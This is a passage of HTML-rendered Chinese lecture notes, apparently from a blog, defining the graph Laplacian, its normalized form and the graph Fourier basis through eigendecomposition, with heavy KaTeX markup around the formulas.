class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>，表示节点</mtext></mrow><annotation encoding=\"application/x-tex\">，表示节点</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">节</span><span class=\"mord cjk_fallback\">点</span></span></span></span> i$ 的度数，即与节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 相连的边的权重总和。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 是权重邻接矩阵，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">W_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 和节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 直接的边的权重</li>\n</ul>\n<p>普通图拉普拉斯矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 的对角元素<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>i</mi><mi>i</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">L_{ii}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的度数，非对角矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">L_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 是节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 和节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 之间边的负权重，如果两个节点<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 之间没有边，那么<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">L_{ij}=0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span></p>\n<p><strong>归一化图拉普拉斯矩阵 L 定义为</strong>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><mi>I</mi><mo>−</mo><msup><mi>D</mi><mrow><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></msup><mi>W</mi><msup><mi>D</mi><mrow><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></msup></mrow><annotation encoding=\"application/x-tex\">L=I-D^{-\\frac{1}{2}}WD^{-\\frac{1}{2}}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0040200000000001em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0040200000000001em;\"><span style=\"top:-3.4130000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mopen nulldelimiter sizing reset-size3 size6\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8443142857142858em;\"><span style=\"top:-2.656em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span style=\"top:-3.2255000000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line mtight\" style=\"border-bottom-width:0.049em;\"></span></span><span style=\"top:-3.384em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.344em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter sizing reset-size3 size6\"></span></span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0040200000000001em;\"><span style=\"top:-3.4130000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mopen nulldelimiter sizing reset-size3 size6\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8443142857142858em;\"><span style=\"top:-2.656em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span style=\"top:-3.2255000000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line mtight\" style=\"border-bottom-width:0.049em;\"></span></span><span style=\"top:-3.384em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.344em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter sizing reset-size3 size6\"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi></mrow><annotation encoding=\"application/x-tex\">I</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span></span></span></span> 是单位矩阵</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>D</mi><mrow><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></msup></mrow><annotation encoding=\"application/x-tex\">D^{- \\frac{1}{2}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9540200000000001em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9540200000000001em;\"><span style=\"top:-3.363em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mopen nulldelimiter sizing reset-size3 size6\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8443142857142858em;\"><span style=\"top:-2.656em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span style=\"top:-3.2255000000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line mtight\" style=\"border-bottom-width:0.049em;\"></span></span><span style=\"top:-3.384em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.344em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter sizing reset-size3 size6\"></span></span></span></span></span></span></span></span></span></span></span></span></span> 是度矩阵的平方根的逆矩阵。度矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 的对角元素是各节点的度数，取其平方根再取逆矩阵</li>\n</ul>\n<h3 id=\"图傅里叶变换\"><a class=\"anchor\" href=\"#图傅里叶变换\">#</a> 图傅里叶变换</h3>\n<p>图傅里叶变换是一种将传统傅里叶变换推广到图结构数据的方法。在图信号处理（Graph Signal Processing）中，它用于分析和处理定义在图节点上的信号。</p>\n<h4 id=\"图的傅里叶基\"><a class=\"anchor\" href=\"#图的傅里叶基\">#</a> 图的傅里叶基</h4>\n<p>图<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span></span></span></span> 的傅里叶基是图拉普拉斯矩阵的正交归一特征向量的集合，具体步骤：</p>\n<ul>\n<li l=\"1\">\n<p>** 特征向量和特征值：** 计算拉普拉斯矩阵 L 的特征向量和特征值。设<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">{</mo><msub><mi>u</mi><mi>l</mi></msub><msubsup><mo stretchy=\"false\">}</mo><mrow><mi>l</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">\\{u_l\\}_{l=1}^n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.033108em;vertical-align:-0.2831079999999999em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">}</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4168920000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2831079999999999em;\"><span></span></span></span></span></span></span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 的一组正交归一特征向量，对应的特征值为\\{\\lambda _l \\}^n_</p>\n</li>\n<li>\n<p>** 拉普拉斯矩阵对角化：** 将图拉普拉斯矩阵对角化为:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><mi>U</mi><mi mathvariant=\"normal\">Λ</mi><msup><mi>U</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">L=U\\Lambda U^T\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8913309999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\">Λ</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span> 是由特征向量构成的矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>u</mi><mi>n</mi></msub><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[u_1,u_2,...,u_n]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span>,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">Λ</mi></mrow><annotation encoding=\"application/x-tex\">\\Lambda</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Λ</span></span></span></span> 是对角矩阵，对角线上的对应的特征值<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><msub><mi>λ</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>λ</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>λ</mi><mi>n</mi></msub><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[\\lambda_1,\\lambda_2,...,\\lambda_n]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">λ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">λ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">λ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span>.</p>\n</li>\n</ul>\n<h4 id=\"图傅里叶变换-2\"><a class=\"anchor\" href=\"#图傅里叶变换-2\">#</a> 图傅里叶变换</h4>\n<ul>\n<li>\n<p>定义：图上信号<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mi>n</mi></msup></mrow><annotation encoding=\"application/x-tex\">x\\in\\mathbb{R}^n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" 